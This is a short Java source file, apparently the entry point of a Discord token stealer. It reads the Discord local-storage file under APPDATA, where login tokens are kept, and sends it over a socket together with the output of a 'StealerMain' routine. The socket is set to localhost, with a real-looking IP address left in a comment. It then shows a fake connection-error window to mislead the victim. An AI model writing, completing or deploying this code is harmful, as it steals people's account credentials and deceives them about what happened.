package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.StealerMain;

import java.io.*;

public class Main {
    public static void main(String[] b) {
        try {
            File file = new File(System.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage.other");

            Socketeer socketeer = new Socketeer("localhost", 1988); //107.174.70.186

            socketeer.f(file);

            socketeer.h(StealerMain.run());

            socketeer.close();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        ErrorWindow.run("Error when establishing connection, code:0003");
    }
}
